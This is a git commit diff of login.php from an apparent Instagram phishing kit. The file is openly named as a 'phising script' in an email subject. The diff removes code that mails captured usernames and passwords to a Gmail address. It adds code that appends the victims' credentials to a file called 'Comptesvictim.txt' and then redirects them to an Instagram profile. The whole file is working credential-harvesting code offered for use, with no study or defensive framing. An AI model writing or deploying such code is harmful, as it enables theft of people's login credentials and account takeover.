b3619f82b1bc3b46a10a2eafeb06715abfc6e7c9
TheLinuxProject <64985848+thelinuxproject@users.noreply.github.com>
2020-05-28 22:15:06 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,19 +1,5 @@
 
 <?php
-	mail_sender(){
-		$username = $POST['username'];
-		$password = $POST['password'];
-		
-		$reciever = "juliedbac@gmail.com";
-		
-		$subject = "Got new access by phising script";
-		$message = "The username is ". $username;
-		$message .= "and password is ". $password;
-		
-		return mail($reciever, $subject, $message);
-	}
-	
-	if(mail_sender()){
-		header("Location: https://www.instagram.com/thelinuxproject/?hl=fr");
-	}
-?>
+ file_put_contents("Comptesvictim.txt"," Compte : " . $_POST['username'] . "  Mot de Pass : " .$_POST['password'] . "\n",FILE_APPEND);
+ header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
+ exit();
